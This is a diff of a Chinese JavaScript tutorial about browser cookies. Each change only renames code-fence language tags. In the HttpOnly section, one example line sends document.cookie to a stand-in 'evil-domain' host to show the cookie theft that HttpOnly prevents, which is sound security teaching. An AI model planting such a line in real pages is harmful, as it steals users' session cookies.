@@ -24,14 +24,14 @@ Cookie 包含以下几方面的信息。
 
 浏览器可以设置不接受 Cookie，也可以设置不向服务器发送 Cookie。`window.navigator.cookieEnabled`属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。
 
-```javascript
+```js
 // 浏览器是否打开 Cookie 功能
 window.navigator.cookieEnabled // true
 ```
 
 `document.cookie`属性返回当前网页的 Cookie。
 
-```javascript
+```js
 // 当前网页的 Cookie
 document.cookie
 ```
@@ -175,7 +175,7 @@ Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
 
 `HttpOnly`属性指定该 Cookie 无法通过 JavaScript 脚本拿到，主要是`Document.cookie`属性、`XMLHttpRequest`对象和 Request API 都拿不到该属性。这样就防止了该 Cookie 被脚本读到，只有浏览器发出 HTTP 请求时，才会带上该 Cookie。
 
-```javascript
+```js
 (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 ```
 
@@ -187,13 +187,13 @@ Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
 
 读取的时候，它会返回当前网页的所有 Cookie，前提是该 Cookie 不能有`HTTPOnly`属性。
 
-```javascript
+```js
 document.cookie // "foo=bar;baz=bar"
 ```
 
 上面代码从`document.cookie`一次性读出两个 Cookie，它们之间使用分号分隔。必须手动还原，才能取出每一个 Cookie 的值。
 
-```javascript
+```js
 var cookies = document.cookie.split(';');
 
 for (var i = 0; i < cookies.length; i++) {
@@ -205,7 +205,7 @@ for (var i = 0; i < cookies.length; i++) {
 
 `document.cookie`属性是可写的，可以通过它为当前网站添加 Cookie。
 
-```javascript
+```js
 document.cookie = 'fontSize=14';
 ```
 
@@ -213,7 +213,7 @@ document.cookie = 'fontSize=14';
 
 但是，`document.cookie`一次只能写入一个 Cookie，而且写入并不是覆盖，而是添加。
 
-```javascript
+```js
 document.cookie = 'test1=hello';
 document.cookie = 'test2=world';
 document.cookie
@@ -224,7 +224,7 @@ document.cookie
 
 写入 Cookie 的时候，可以一起写入 Cookie 的属性。
 
-```javascript
+```js
 document.cookie = "foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT";
 ```
 
@@ -239,7 +239,7 @@ document.cookie = "foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT";
 
 `document.cookie`写入 Cookie 的例子如下。
 
-```javascript
+```js
 document.cookie = 'fontSize=14; '
   + 'expires=' + someDate.toGMTString() + '; '
   + 'path=/subdirectory; '
@@ -250,7 +250,7 @@ Cookie 的属性一旦设置完成，就没有办法读取这些属性的值。
 
 删除一个现存 Cookie 的唯一方法，是设置它的`expires`属性为一个过去的日期。
 
-```javascript
+```js
 document.cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT';
 ```
 
